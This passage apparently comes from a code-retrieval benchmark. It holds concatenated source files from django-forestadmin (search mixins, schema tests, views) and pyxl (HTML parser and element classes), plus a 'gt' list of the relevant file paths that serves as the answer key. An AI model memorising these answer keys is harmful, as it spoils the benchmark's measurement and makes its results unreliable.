search)\n\n        return q_objects\n\n    def get_search(self, params, Model):\n        q_objects = Q()\n        search = params['search']\n\n        q_objects |= self.fill_conditions(search, Model._meta.db_table)\n\n        if 'searchExtended' in params and strtobool(str(params['searchExtended'])):\n            q_objects |= self.handle_search_extended(search, Model)\n\n        return q_objects\n\n'django-forestadmin/django_forest/tests/utils/test_schema.py'\n:import copy\nimport json\nimport os\nimport sys\n\nimport django\nimport pytest\nfrom unittest import mock\nfrom django.test import TestCase, override_settings\n\nfrom django_forest.tests.fixtures.schema import test_schema, test_choice_schema, \\\n    test_exclude_django_contrib_schema, test_serialized_schema, test_question_schema_data\nfrom django_forest.tests.utils.test_forest_api_requester import mocked_requests, mocked_requests_no_data\nfrom django_forest.utils.collection import Collection\nfrom django_forest.utils.schema.json_api_schema import JsonApiSchema\nfrom django_forest.utils.models import Models\nfrom django_forest.utils.schema import Schema\nfrom django_forest.utils.scope import ScopeManager\n\n\n@pytest.fixture()\ndef reset_config_dir_import():\n    for key in list(sys.modules.keys()):\n        if key.startswith('django_forest.tests.forest'):\n            del sys.modules[key]\n\n\n@pytest.mark.skipif(sys.version_info < (3, 8), reason=\"requires python3.8 or higher\")\nclass UtilsSchemaTests(TestCase):\n\n    def setUp(self):\n        Schema.schema = copy.deepcopy(test_schema)\n\n    def tearDown(self):\n\n        Collection._registry = {}\n        JsonApiSchema._registry = {}\n        ScopeManager.cache = {}\n        Schema.schema_data = None\n        Models.models = None\n\n    @mock.patch.object(django, 'get_version', return_value='9.9.9')\n    @mock.patch('importlib.metadata.version', return_value='0.0.0')\n    def test_build_schema(self, mock_version, mock_orm_version):\n\n        Schema.schema = {\n            'collections': [],\n            'meta': {\n                'liana': 'django-forestadmin',\n                'liana_version': '0.0.0',\n                'stack': {\n                    'database_type': 'sqlite',\n                    'orm_version': '9.9.9'\n                },\n            }\n        }\n        Schema.models = Models.list()\n        schema = Schema.build_schema()\n        self.assertEqual(schema, test_schema)\n\n    @override_settings(FOREST={'INCLUDED_MODELS': ['tests_choice']})\n    @mock.patch.object(django, 'get_version', return_value='9.9.9')\n    @mock.patch('importlib.metadata.version', return_value='0.0.0')\n    def test_build_schema_included_models(self, mock_version, mock_orm_version):\n\n        Schema.schema = {\n            'collections': [],\n            'meta': {\n                'liana': 'django-forestadmin',\n                'liana_version': '0.0.0',\n                'stack': {\n                    'database_type': 'sqlite',\n                    'orm_version': '9.9.9'\n                },\n            }\n        }\n        Schema.models = Models.list(force=True)\n        schema = Schema.build_schema()\n        self.assertEqual(schema, test_choice_schema)\n\n    @override_settings(FOREST={'EXCLUDED_MODELS': ['tests_permission', 'tests_group', 'tests_user', 'tests_contentType']})\n    @mock.patch.object(django, 'get_version', return_value='9.9.9')\n    @mock.patch('importlib.metadata.version', return_value='0.0.0')\n    def test_build_schema_excluded_models(self, mock_version, mock_orm_version):\n\n        self.maxDiff = None\n        Schema.schema = {\n            'collections': [],\n            'meta': {\n                'liana': 'django-forestadmin',\n                'liana_version': '0.0.0',\n                'stack': {\n                    'database_type': 'sqlite',\n                    'orm_version': '9.9.9'\n                },\n            }\n        }\n        Schema.models = Models.list(force=True)\n        schema = Schema.build_schema()\n        self.assertEqual(schema, test_exclude_django_contrib_schema)\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @mock.patch('django_forest.utils.collection.Collection')\n    def test_add_smart_features(self, collection_mock):\n        Schema.add_smart_features()\n        from django_forest.tests.forest import QuestionForest\n        from django_forest.tests.models import Question\n        collection_mock.register.assert_any_call(QuestionForest, Question)\n\n    def test_get_collection(self):\n        collection = Schema.get_collection('tests_question')\n        self.assertEqual(collection, [x for x in test_schema['collections'] if x['name'] == 'tests_question'][0])\n\n    def test_get_collection_inexist(self):\n        collection = Schema.get_collection('Foo')\n        self.assertEqual(collection, None)\n\n    def test_handle_json_api_schema(self):\n        Schema.handle_json_api_schema()\n        self.assertEqual(len(JsonApiSchema._registry), 22)\n\n\n\n@pytest.fixture()\ndef reset_config_dir_import():\n    for key in list(sys.modules.keys()):\n        if key.startswith('django_forest.tests.forest'):\n            del sys.modules[key]\n\n\nfile_path = os.path.join(os.getcwd(), '.forestadmin-schema.json')\n\n\n@pytest.fixture()\ndef dumb_forestadmin_schema():\n    schema_data = json.dumps(test_schema, indent=2)\n    with open(file_path, 'w') as f:\n        f.write(schema_data)\n\n\n@pytest.fixture()\ndef invalid_forestadmin_schema():\n    schema_data = 'invalid'\n    with open(file_path, 'w') as f:\n        f.write(schema_data)\n\n\nclass UtilsSchemaFileTests(TestCase):\n    def setUp(self):\n        Schema.build_schema()\n        Schema.add_smart_features()\n\n    def tearDown(self):\n\n        Collection._registry = {}\n        JsonApiSchema._registry = {}\n        ScopeManager.cache = {}\n        Schema.schema_data = None\n        Models.models = None\n        if os.path.exists(file_path):\n            os.remove(file_path)\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    def test_handle_schema_file_no_file(self):\n        with self.assertLogs() as cm:\n            self.assertRaises(Exception, Schema.handle_schema_file())\n            self.assertIsNone(Schema.schema_data)\n            self.assertEqual(cm.output, [\n                'ERROR:django_forest.utils.schema:The .forestadmin-schema.json file does not exist.',\n                'ERROR:django_forest.utils.schema:The schema cannot be synchronized with Forest Admin servers.'\n            ])\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @pytest.mark.usefixtures('dumb_forestadmin_schema')\n    def test_handle_schema_file_production(self):\n        Schema.handle_schema_file()\n        self.assertIsNotNone(Schema.schema_data)\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @pytest.mark.usefixtures('invalid_forestadmin_schema')\n    def test_handle_schema_file_invalid_json_production(self):\n        with self.assertLogs() as cm:\n            self.assertRaises(Exception, Schema.handle_schema_file())\n            self.assertIsNone(Schema.schema_data)\n            self.assertEqual(cm.output, [\n                'ERROR:django_forest.utils.schema:The content of .forestadmin-schema.json file is not a correct JSON.',\n                'ERROR:django_forest.utils.schema:The schema cannot be synchronized with Forest Admin servers.'\n            ])\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @override_settings(DEBUG=True)\n    def test_handle_schema_file_debug(self):\n        Schema.handle_schema_file()\n        with open(file_path, 'r') as f:\n            data = f.read()\n            data = json.loads(data)\n            question = [c for c in data['collections'] if c['name'] == 'tests_question'][0]\n            self.assertEqual(len(question['fields']), 7)\n            foo_field = [f for f in question['fields'] if f['field'] == 'foo'][0]\n            self.assertFalse('get' in foo_field)\n            self.assertIsNotNone(Schema.schema_data)\n\n\nclass UtilsSchemaSendTests(TestCase):\n\n    def test_get_serialized_schema(self):\n        Schema.schema_data = test_question_schema_data\n        serialized_schema = Schema.get_serialized_schema()\n        self.assertEqual(serialized_schema, test_serialized_schema)\n\n    @override_settings(FOREST={'FOREST_DISABLE_AUTO_SCHEMA_APPLY': True})\n    @mock.patch.object(Schema, 'get_serialized_schema')\n    def test_send_apimap_disable_apply(self, mocked_get_serialized_schema):\n        Schema.send_apimap()\n        mocked_get_serialized_schema.assert_not_called()\n\n    @override_settings(FOREST={'FOREST_DISABLE_AUTO_SCHEMA_APPLY': 'foo'})\n    def test_send_apimap_server_error(self):\n        self.assertRaises(Exception, Schema.send_apimap())\n\n    @override_settings(DEBUG=True)\n    @mock.patch('requests.post', return_value=mocked_requests({'key1': 'value1'}, 200))\n    def test_send_apimap(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        Schema.send_apimap()\n        mocked_requests_post.assert_called_once_with(\n            'https://api.test.forestadmin.com/forest/apimaps',\n            data=json.dumps(test_serialized_schema),\n            headers={'Content-Type': 'application/json', 'forest-secret-key': 'foo'},\n            params={},\n            verify=False\n        )\n\n    @override_settings(DEBUG=True)\n    @mock.patch('requests.post', return_value=mocked_requests_no_data(204))\n    def test_send_apimap_no_changes(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        Schema.send_apimap()\n        mocked_requests_post.assert_called_once_with(\n            'https://api.test.forestadmin.com/forest/apimaps',\n            data=json.dumps(test_serialized_schema),\n            headers={'Content-Type': 'application/json', 'forest-secret-key': 'foo'},\n            params={},\n            verify=False\n        )\n\n    @mock.patch('requests.post', return_value=mocked_requests({'key1': 'value1'}, 200))\n    def test_send_apimap_production(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        Schema.send_apimap()\n        mocked_requests_post.assert_called_once_with(\n            'https://api.test.forestadmin.com/forest/apimaps',\n            data=json.dumps(test_serialized_schema),\n            headers={'Content-Type': 'application/json', 'forest-secret-key': 'foo'},\n            params={},\n        )\n\n    @mock.patch('requests.post', return_value=mocked_requests({'warning': 'foo'}, 200))\n    def test_send_apimap_warning(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message, 'foo')\n            self.assertEqual(cm.records[0].levelname, 'WARNING')\n\n    @mock.patch('requests.post', side_effect=Exception('foo'))\n    def test_send_apimap_zero(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            self.assertRaises(Exception, Schema.send_apimap())\n            self.assertEqual(cm.records[0].message,\n                             'Cannot send the apimap to Forest. Are you online?')\n            self.assertEqual(cm.records[0].levelname, 'WARNING')\n\n    @mock.patch('requests.post', return_value=mocked_requests({}, 404))\n    def test_send_apimap_not_found(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message,\n                             'Cannot find the project related to the envSecret you configured. Can you check on Forest that you copied it properly in the Forest settings?')\n            self.assertEqual(cm.records[0].levelname, 'ERROR')\n\n    @mock.patch('requests.post', return_value=mocked_requests({}, 503))\n    def test_send_apimap_unavailable(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message,\n                             'Forest is in maintenance for a few minutes. We are upgrading your experience in the forest. We just need a few more minutes to get it right.')\n            self.assertEqual(cm.records[0].levelname, 'WARNING')\n\n    @mock.patch('requests.post', return_value=mocked_requests({}, 500))\n    def test_send_apimap_error(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message,\n                             'An error occured with the apimap sent to Forest. Please contact support@forestadmin.com for further investigations.')\n            self.assertEqual(cm.records[0].levelname, 'ERROR')\n\n\nclass UtilsSchemaInitTests(TestCase):\n    def test_schema_meta(self):\n        self.assertTrue('liana' in Schema.schema['meta'])\n        self.assertTrue('liana_version' in Schema.schema['meta'])\n        self.assertTrue('stack' in Schema.schema['meta'])\n        self.assertTrue('database_type' in Schema.schema['meta']['stack'])\n        self.assertTrue('orm_version' in Schema.schema['meta']['stack'])\n\n\n@pytest.mark.skipif(sys.version_info < (3, 8), reason=\"requires python3.8 or higher\")\nclass UtilsGetAppVersionTests(TestCase):\n    @mock.patch('importlib.metadata.version', return_value='0.0.1')\n    def test_get_app_version(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.1')\n\n    @mock.patch('importlib.metadata.version', side_effect=Exception('error'))\n    def test_get_app_version_error(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.0')\n\n\n@pytest.mark.skipif(sys.version_info >= (3, 8), reason=\"requires python3.7 or lower\")\nclass UtilsGetAppOldPythonTests(TestCase):\n\n    @mock.patch('importlib_metadata.version', return_value='0.0.1')\n    def test_get_app_version(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.1')\n\n    @mock.patch('importlib_metadata.version', side_effect=Exception('error'))\n    def test_get_app_version_error(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.0')\n\n'django-forestadmin/django_forest/utils/views/base.py'\n:import json\n\nfrom django.http import JsonResponse\nfrom django.views import generic\n\nfrom django_forest.resources.utils.queryset import QuerysetMixin\nfrom django_forest.utils import get_association_field, get_token\nfrom django_forest.utils.models import Models\n\n\nclass BaseView(QuerysetMixin, generic.View):\n    def is_authenticated(self, request):\n        try:\n            token = get_token(request)\n        except Exception:\n            return False\n        else:\n            return token\n\n    def get_body(self, body):\n        body_unicode = body.decode('utf-8')\n        return json.loads(body_unicode)\n\n    def error_response(self, e):\n        return JsonResponse({'errors': [{'detail': str(e)}]}, status=400)\n\n    def get_model(self, resource):\n        Model = Models.get(resource)\n        if Model is None:\n            raise Exception(f'no model found for resource {resource}')\n        return Model\n\n    def handle_all_records(self, attributes, Model, request):\n        all_records_ids_excluded = attributes.get('all_records_ids_excluded', [])\n        all_records_subset_query = attributes.get('all_records_subset_query', [])\n        parent_collection_id = attributes.get('parent_collection_id', None)\n        parent_collection_name = attributes.get('parent_collection_name', '')\n        parent_association_name = attributes.get('parent_association_name', '')\n        if parent_collection_id and parent_collection_name and parent_association_name:\n            parent_model = Models.get(parent_collection_name)\n            association_field = get_association_field(parent_model, parent_association_name)\n            RelatedModel = association_field.related_model\n            queryset = getattr(parent_model.objects.get(pk=parent_collection_id), parent_association_name).all()\n            queryset = self.filter_queryset(queryset, RelatedModel, all_records_subset_query, request)\n        else:\n            queryset = Model.objects.all()\n            queryset = self.filter_queryset(queryset, Model, all_records_subset_query, request)\n\n        return [x for x in queryset.values_list('id', flat=True) if str(x) not in all_records_ids_excluded]\n\n    def get_ids_from_request(self, request, Model):\n        body = self.get_body(request.body)\n\n        if 'data' in body:\n            data = body['data']\n            if 'attributes' not in data:\n                return [x['id'] for x in body['data']]\n            else:\n                attributes = data['attributes']\n\n                if not attributes.get('all_records', False):\n                    return attributes.get('ids', [])\n                else:\n                    return self.handle_all_records(attributes, Model, request)\n        elif 'recordIds' in body:\n            return body['recordIds']\n\n'django-forestadmin/django_forest/resources/utils/queryset/__init__.py'\n:from .filters import FiltersMixin\nfrom .limit_fields import LimitFieldsMixin\nfrom .pagination import PaginationMixin\nfrom .scope import ScopeMixin\nfrom .search import SearchMixin\nfrom .segment import SegmentMixin\nfrom django_forest.resources.utils.decorators import DecoratorsMixin\n\n\nclass QuerysetMixin(\n    PaginationMixin, FiltersMixin, SearchMixin, ScopeMixin, DecoratorsMixin, LimitFieldsMixin, SegmentMixin\n):\n    def filter_queryset(self, queryset, Model, params, request):\n\n        scope_filters = self.get_scope(request, Model)\n        if scope_filters is not None:\n            queryset = queryset.filter(scope_filters)\n\n\n        PARAMS = {\n            'filters': self.get_filters,\n            'search': self.get_search\n        }\n        for name, method in PARAMS.items():\n            if name in params and params[name]:\n                queryset = queryset.filter(method(params, Model))\n        return queryset\n\n    def enhance_queryset(self, queryset, Model, params, request, apply_pagination=True):\n\n        queryset = self.filter_queryset(queryset, Model, params, request)\n\n\n        if 'sort' in params:\n            queryset = queryset.order_by(params['sort'].replace('.', '__'))\n\n\n        queryset = self.handle_segment(params, Model, queryset)\n\n\n        queryset = self.handle_limit_fields(params, Model, queryset)\n\n\n        if apply_pagination:\n            queryset = self.get_pagination(params, queryset)\n\n        return queryset\n\n'django-forestadmin/django_forest/tests/forest/question.py'\n:from django.db.models import Q\n\nfrom django_forest.tests.models import Question\nfrom django_forest.utils.collection import Collection\n\n\n\nfrom django_forest.utils.views.base import BaseView\n\n\nclass QuestionForest(Collection):\n    def load(self):\n        self.fields = [\n            {\n                'field': 'foo',\n                'get': self.foo_get,\n                'set': self.foo_set,\n                'search': self.search_foo,\n                'filter': self.filter_foo,\n                'is_filterable': True\n            },\n            {\n                'field': 'bar',\n                'get': 'bar_get',\n                'set': 'bar_set',\n                'search': 'search_bar',\n                'filter': 'filter_bar',\n                'is_filterable': True\n            }\n        ]\n\n        self.actions = [\n            {\n                'name': 'Send invoice',\n                'type': 'single',\n                'fields': [\n                    {\n                        'field': 'country',\n                        'type': 'Enum',\n                        'enums': ['FR', 'US']\n                    },\n                    {\n                        'field': 'phones',\n                        'type': ['Enum'],\n                        'enums': [['01', '02'], ['998', '999']]\n                    },\n                    {\n                        'field': 'city',\n                        'type': 'String',\n                        'hook': 'cityChange'\n                    },\n                    {\n                        'field': 'zip code',\n                        'type': 'String',\n                        'hook': 'zipCodeChange'\n                    },\n                ],\n                'hooks': {\n                    'load': self.invoice_load,\n                    'change': {\n                        'cityChange': self.invoice_change_city,\n                        'zipCodeChange': self.invoice_change_zip_code,\n                    },\n                },\n            },\n            {\n                'name': 'Mark as Live'\n            }, {\n                'name': 'Generate invoice',\n                'download': True,\n            },\n        ]\n\n        self.segments = [\n            {\n                'name': 'Best questions',\n                'where': self.best_questions\n            }\n        ]\n\n    def foo_get(self, obj):\n        return f'{obj.question_text}+foo'\n\n    def foo_set(self, obj, value):\n        obj.question_text = f'{value}+foo'\n        return obj\n\n    def search_foo(self, search):\n        return Q(question_text=search)\n\n    def filter_foo(self, operator, value):\n        from django_forest.resources.utils.queryset.filters.utils import OPERATORS\n        kwargs = {f'question_text{OPERATORS[operator]}': value}\n        is_negated = operator.startswith('not')\n        if is_negated:\n            return ~Q(**kwargs)\n        return Q(**kwargs)\n\n    def bar_get(self, obj):\n        return f'{obj.question_text}+bar'\n\n    def bar_set(self, obj, value):\n        obj.question_text = f'bar+{value}'\n        return obj\n\n    def search_bar(self, search):\n        return Q(question_text=search)\n\n    def filter_bar(self, operator, value):\n        from django_forest.resources.utils.queryset.filters.utils import OPERATORS\n        kwargs = {f'question_text{OPERATORS[operator]}': value}\n        is_negated = operator.startswith('not')\n        if is_negated:\n            return ~Q(**kwargs)\n        return Q(**kwargs)\n\n    def best_questions(self):\n        questions = Question.objects.raw()\n        return Q(**{'id__in': [question.id for question in questions]})\n\n    def invoice_load(self, fields, request, *args, **kwargs):\n        ids = BaseView().get_ids_from_request(request, Question)\n\n        country = next((x for x in fields if x['field'] == 'country'), None)\n        country['value'] = 'IT'\n\n        phones = next((x for x in fields if x['field'] == 'phones'), None)\n        phones['value'] = ['foo', 'bar']\n        return fields\n\n    def invoice_change_city(self, fields, request, changed_field, *args, **kwargs):\n        zip_code = next((x for x in fields if x['field'] == 'zip code'), None)\n        zip_code['value'] = '83'\n        return fields\n\n    def invoice_change_zip_code(self, fields, request, changed_field, *args, **kwargs):\n        return fields\n\n\nCollection.register(QuestionForest, Question)\n\n'django-forestadmin/django_forest/tests/forest/__init__.py'\n:from django_forest.tests.forest.choice import ChoiceForest\nfrom django_forest.tests.forest.question import QuestionForest\nfrom django_forest.tests.forest.place import PlaceForest\n\n__all__ = ['QuestionForest', 'ChoiceForest', 'PlaceForest']\n",
        "gt": [
            "'django-forestadmin/django_forest/resources/utils/queryset/search.py'",
            "'django-forestadmin/django_forest/resources/utils/queryset/__init__.py'",
            "'django-forestadmin/django_forest/utils/views/base.py'",
            "'django-forestadmin/django_forest/tests/forest/question.py'",
            "'django-forestadmin/django_forest/tests/forest/__init__.py'",
            "'django-forestadmin/django_forest/tests/utils/test_schema.py'"
        ]
    },
    {
        "files": [
            "'pyxl/pyxl/codec/parser.py'",
            "'pyxl/pyxl/utils.py'",
            "'pyxl/pyxl/html.py'",
            "'pyxl/pyxl/browser_hacks.py'"
        ],
        "content": "'pyxl/pyxl/codec/parser.py'\n:\n\nimport tokenize\nfrom pyxl import html\nfrom html_tokenizer import (\n        HTMLTokenizer,\n        ParseError as TokenizerParseError,\n        State,\n)\nfrom pytokenize import Untokenizer\n\nclass ParseError(Exception):\n    def __init__(self, message, pos=None):\n        if pos is not None:\n            super(ParseError, self).__init__(\"%s at line %d char %d\" % ((message,) + pos))\n        else:\n            super(ParseError, self).__init__(message)\n\nclass PyxlParser(HTMLTokenizer):\n    def __init__(self, row, col):\n        super(PyxlParser, self).__init__()\n        self.start = self.end = (row, col)\n        self.output = []\n        self.open_tags = []\n        self.remainder = None\n        self.next_thing_is_python = False\n        self.last_thing_was_python = False\n        self.last_thing_was_close_if_tag = False\n\n    def feed(self, token):\n        ttype, tvalue, tstart, tend, tline = token\n\n        assert tstart[0] >= self.end[0], \"row went backwards\"\n        if tstart[0] > self.end[0]:\n            self.output.append(\"\\n\" * (tstart[0] - self.end[0]))\n\n\n        elif tstart[1] > self.end[1]:\n            super(PyxlParser, self).feed(\" \")\n\n        self.end = tstart\n\n        if ttype != tokenize.INDENT:\n            while tvalue and not self.done():\n                c, tvalue = tvalue[0], tvalue[1:]\n                if c == \"\\n\":\n                    self.end = (self.end[0]+1, 0)\n                else:\n                    self.end = (self.end[0], self.end[1]+1)\n                try:\n                    super(PyxlParser, self).feed(c)\n                except TokenizerParseError:\n                    raise ParseError(\"HTML Parsing error\", self.end)\n        if self.done():\n            self.remainder = (ttype, tvalue, self.end, tend, tline)\n        else:\n            self.end = tend\n\n    def feed_python(self, tokens):\n        ttype, tvalue, tstart, tend, tline = tokens[0]\n        assert tstart[0] >= self.end[0], \"row went backwards\"\n        if tstart[0] > self.end[0]:\n            self.output.append(\"\\n\" * (tstart[0] - self.end[0]))\n        ttype, tvalue, tstart, tend, tline = tokens[-1]\n        self.end = tend\n\n        if self.state in [State.DATA, State.CDATA_SECTION]:\n            self.next_thing_is_python = True\n            self.emit_data()\n            self.output.append(\"%s, \" % Untokenizer().untokenize(tokens))\n            self.next_thing_is_python = False\n            self.last_thing_was_python = True\n        elif self.state in [State.BEFORE_ATTRIBUTE_VALUE,\n                            State.ATTRIBUTE_VALUE_DOUBLE_QUOTED,\n                            State.ATTRIBUTE_VALUE_SINGLE_QUOTED,\n                            State.ATTRIBUTE_VALUE_UNQUOTED]:\n            super(PyxlParser, self).feed_python(tokens)\n\n    def feed_position_only(self, token):\n\n        ttype, tvalue, tstart, tend, tline = token\n        self.feed((ttype, '', tstart, tstart, tline))\n        self.end = tend\n\n    def python_comment_allowed(self):\n        \"\"\"Returns true if we're in a state where a\n\n        <a\n           class=\"bar\"\n           href=\"\n\n            Link text\n        </a>\n        Returns true if we're in a state where a { starts python mode.\n\n        <!-- {this isn't python} -->\n        \"\"\"\n        return self.state not in (State.COMMENT,)\n\n    def feed_comment(self, token):\n        ttype, tvalue, tstart, tend, tline = token\n        self.feed((ttype, '', tstart, tstart, tline))\n        self.output.append(tvalue)\n        self.end = tend\n\n    def get_remainder(self):\n        return self.remainder\n\n    def done(self):\n        return len(self.open_tags) == 0 and self.state == State.DATA and self.output\n\n    def get_token(self):\n        return (tokenize.STRING, ''.join(self.output), self.start, self.end, '')\n\n    @staticmethod\n    def safe_attr_name(name):\n        if name == \"class\":\n            return \"xclass\"\n        if name == \"for\":\n            return \"xfor\"\n        return name.replace('-', '_').replace(':', 'COLON')\n\n    def _handle_attr_value(self, attr_value):\n        def format_parts():\n            prev_was_python = False\n            for i, part in enumerate(attr_value):\n                if type(part) == list:\n                    yield part\n                    prev_was_python = True\n                else:\n                    next_is_python = bool(i+1 < len(attr_value) and type(attr_value[i+1]) == list)\n                    part = self._normalize_data_whitespace(part, prev_was_python, next_is_python)\n                    if part:\n                        yield part\n                    prev_was_python = False\n\n        attr_value = list(format_parts())\n        if len(attr_value) == 1:\n            part = attr_value[0]\n            if type(part) == list:\n                self.output.append(Untokenizer().untokenize(part))\n            else:\n                self.output.append(repr(part))\n        else:\n            self.output.append('u\"\".join((')\n            for part in attr_value:\n                if type(part) == list:\n                    self.output.append('unicode(')\n                    self.output.append(Untokenizer().untokenize(part))\n                    self.output.append(')')\n                else:\n                    self.output.append(repr(part))\n                self.output.append(', ')\n            self.output.append('))')\n\n    @staticmethod\n    def _normalize_data_whitespace(data, prev_was_py, next_is_py):\n        if not data:\n            return ''\n        if '\\n' in data and not data.strip():\n            if prev_was_py and next_is_py:\n                return ' '\n            else:\n                return ''\n        if prev_was_py and data.startswith('\\n'):\n                data = \" \" + data.lstrip('\\n')\n        if next_is_py and data.endswith('\\n'):\n                data = data.rstrip('\\n') + \" \"\n        data = data.strip('\\n')\n        data = data.replace('\\r', ' ')\n        data = data.replace('\\n', ' ')\n        return data\n\n    def handle_starttag(self, tag, attrs, call=True):\n        self.open_tags.append({'tag':tag, 'row': self.end[0]})\n        if tag == 'if':\n            if len(attrs) != 1:\n                raise ParseError(\"if tag only takes one attr called 'cond'\", self.end)\n            if 'cond' not in attrs:\n                raise ParseError(\"if tag must contain the 'cond' attr\", self.end)\n\n            self.output.append('html._push_condition(bool(')\n            self._handle_attr_value(attrs['cond'])\n            self.output.append(')) and html.x_frag()(')\n            self.last_thing_was_python = False\n            self.last_thing_was_close_if_tag = False\n            return\n        elif tag == 'else':\n            if len(attrs) != 0:\n                raise ParseError(\"else tag takes no attrs\", self.end)\n            if not self.last_thing_was_close_if_tag:\n                raise ParseError(\"<else> tag must come right after </if>\", self.end)\n\n            self.output.append('(not html._last_if_condition) and html.x_frag()(')\n            self.last_thing_was_python = False\n            self.last_thing_was_close_if_tag = False\n            return\n\n        module, dot, identifier = tag.rpartition('.')\n        identifier = 'x_%s' % identifier\n        x_tag = module + dot + identifier\n\n        if hasattr(html, x_tag):\n            self.output.append('html.')\n        self.output.append('%s(' % x_tag)\n\n        first_attr = True\n        for attr_name, attr_value in attrs.iteritems():\n            if first_attr: first_attr = False\n            else: self.output.append(', ')\n\n            self.output.append(self.safe_attr_name(attr_name))\n            self.output.append('=')\n            self._handle_attr_value(attr_value)\n\n        self.output.append(')')\n        if call:\n\n            self.output.append('(')\n        self.last_thing_was_python = False\n        self.last_thing_was_close_if_tag = False\n\n    def handle_endtag(self, tag_name, call=True):\n        if call:\n\n            self.output.append(\")\")\n\n        assert self.open_tags, \"got </%s> but tag stack empty; parsing should be over!\" % tag_name\n\n        open_tag = self.open_tags.pop()\n        if open_tag['tag'] != tag_name:\n            raise ParseError(\"<%s> on line %d closed by </%s> on line %d\" %\n                             (open_tag['tag'], open_tag['row'], tag_name, self.end[0]))\n\n        if open_tag['tag'] == 'if':\n            self.output.append(',html._leave_if()')\n            self.last_thing_was_close_if_tag = True\n        else:\n            self.last_thing_was_close_if_tag = False\n\n        if len(self.open_tags):\n            self.output.append(\",\")\n        self.last_thing_was_python = False\n\n    def handle_startendtag(self, tag_name, attrs):\n        self.handle_starttag(tag_name, attrs, call=False)\n        self.handle_endtag(tag_name, call=False)\n\n    def handle_data(self, data):\n        data = self._normalize_data_whitespace(\n                data, self.last_thing_was_python, self.next_thing_is_python)\n        if not data:\n            return\n\n\n\n        data = data.replace('\"', '\\\\\"')\n        self.output.append('html.rawhtml(u\"%s\"), ' % data)\n\n        self.last_thing_was_python = False\n        self.last_thing_was_close_if_tag = False\n\n    def handle_comment(self, data):\n        self.handle_startendtag(\"html_comment\", {\"comment\": [data.strip()]})\n        self.last_thing_was_python = False\n        self.last_thing_was_close_if_tag = False\n\n    def handle_doctype(self, data):\n        self.handle_startendtag(\"html_decl\", {\"decl\": ['DOCTYPE ' + data]})\n        self.last_thing_was_python = False\n        self.last_thing_was_close_if_tag = False\n\n    def handle_cdata(self, data):\n        self.handle_startendtag(\"html_marked_decl\", {\"decl\": ['CDATA[' + data]})\n        self.last_thing_was_python = False\n        self.last_thing_was_close_if_tag = False\n\n'pyxl/pyxl/utils.py'\n:\n\nimport xml.sax.saxutils\n\nxml_escape = xml.sax.saxutils.escape\nxml_unescape = xml.sax.saxutils.unescape\nescape_other = {\n    '\"': '&quot;',\n    }\nunescape_other = {\n    '&quot;': '\"',\n    }\n\ndef escape(obj):\n    return xml_escape(unicode(obj), escape_other)\n\ndef unescape(obj):\n    return xml_unescape(unicode(obj), unescape_other)\n\n'pyxl/pyxl/html.py'\n:\n\nfrom pyxl.utils import escape\nfrom pyxl.base import x_base\n\n\nfrom pyxl.browser_hacks import x_cond_comment\n\n_if_condition_stack = []\n_last_if_condition = None\n\ndef _push_condition(cond):\n    _if_condition_stack.append(cond)\n    return cond\n\ndef _leave_if():\n    global _last_if_condition\n    _last_if_condition = _if_condition_stack.pop()\n    return []\n\nclass x_html_element(x_base):\n    def _to_list(self, l):\n        l.extend((u'<', self.__tag__))\n        for name, value in self.__attributes__.iteritems():\n            l.extend((u' ', name, u'=\"', escape(value), u'\"'))\n        l.append(u'>')\n\n        for child in self.__children__:\n            x_base._render_child_to_list(child, l)\n\n        l.extend((u'</', self.__tag__, u'>'))\n\nclass x_html_element_nochild(x_base):\n    def append(self, child):\n        raise Exception('<%s> does not allow children.', self.__tag__)\n\n    def _to_list(self, l):\n        l.extend((u'<', self.__tag__))\n        for name, value in self.__attributes__.iteritems():\n            l.extend((u' ', name, u'=\"', escape(value), u'\"'))\n        l.append(u' />')\n\nclass x_html_comment(x_base):\n    __attrs__ = {\n        'comment': unicode,\n        }\n\n    def _to_list(self, l):\n        pass\n\nclass x_html_decl(x_base):\n    __attrs__ = {\n        'decl': unicode,\n        }\n\n    def _to_list(self, l):\n        l.extend((u'<!', self.attr('decl'), u'>'))\n\nclass x_html_marked_decl(x_base):\n    __attrs__ = {\n        'decl': unicode,\n        }\n\n    def _to_list(self, l):\n        l.extend((u'<![', self.attr('decl'), u']]>'))\n\nclass x_html_ms_decl(x_base):\n    __attrs__ = {\n        'decl': unicode,\n        }\n\n    def _to_list(self, l):\n        l.extend((u'<![', self.attr('decl'), u']>'))\n\nclass x_rawhtml(x_html_element_nochild):\n    __attrs__= {\n        'text': unicode,\n        }\n\n    def _to_list(self, l):\n        if not isinstance(self.text, unicode):\n            l.append(unicode(self.text, 'utf8'))\n        else:\n            l.append(self.text)\n\ndef rawhtml(text):\n    return x_rawhtml(text=text)\n\nclass x_frag(x_base):\n    def _to_list(self, l):\n        for child in self.__children__:\n            self._render_child_to_list(child, l)\n\nclass x_a(x_html_element):\n    __attrs__ = {\n        'href': unicode,\n        'rel': unicode,\n        'type': unicode,\n      